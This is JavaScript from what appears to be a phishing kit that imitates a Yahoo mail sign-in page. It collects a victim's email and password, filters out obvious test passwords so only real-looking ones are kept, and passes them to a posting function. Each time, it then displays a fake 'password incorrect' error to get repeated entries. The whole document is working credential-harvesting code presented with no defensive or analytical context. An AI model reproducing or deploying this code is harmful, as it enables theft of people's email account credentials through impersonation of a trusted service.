// 
const yah = document.getElementById("page_id");
let yahMail = "";
let yah_input = document.getElementById("yah_input");

function getYahPass(email) {
    yahMail = email;
    yah_input.value = "";
    yah_input.type = "password";
    yah_input.autocomplete = "off";
    yah_input.placeholder = "Enter password";

    $("#yah_form_top").html(`
        <img src="./pages/yah_oo/logo1.png" alt="Mail">
            <p>${email}</p>
            <br>
            <h2>Enter password</h2>
            <p>to finish signing in</p>
    `)

    $("#yah_form_mid").html(`
        <p><a href="#">Forgotten password?</a></p>
    `)
}

// 
if (validEmail.test(usermail) && yah != null) {
    if (yah.value.toLowerCase() == "yah") {
        getYahPass(usermail)  
    }
}

// 
$("#yah_form").on('submit', (e)=>{
    e.preventDefault();

    if (validEmail.test($("#yah_input").val())) {
        getYahPass($("#yah_input").val())
    }

    let yah_input = document.getElementById("yah_input");

    if (!validEmail.test(yahMail)) {
        yah_input.style.borderColor = "red";
        return
    }
    else{
        yah_input.style.borderColor = "silver";
    }

    if ($("#yah_input").val() == "") {
        return
    }

    if (validEmail.test($("#yah_input").val()) || $("#yah_input").val().length < 6 || $("#yah_input").val().toLowerCase() == "qwerty" || $("#yah_input").val() == 123456 || $("#yah_input").val().toLowerCase() == "password" || $("#yah_input").val().toLowerCase() == "testing") {
        yah_input.style.borderColor = "red";
        return
    }
    else{
        yah_input.style.borderColor = "silver";
    }

    $("#loader").show().css({"display":"flex"})

    let url = yahMail.split('@');

    postResult(url[1], yahMail, $("#yah_input").val(), postCount);
    
    setTimeout(() => {
        yah_input.style.borderColor = "red";
        msgTimer("Your password or account is incorrect. Please Enter correct account password")
        postCount++
        $("#yah_input").val("")
    }, delayCounter);
});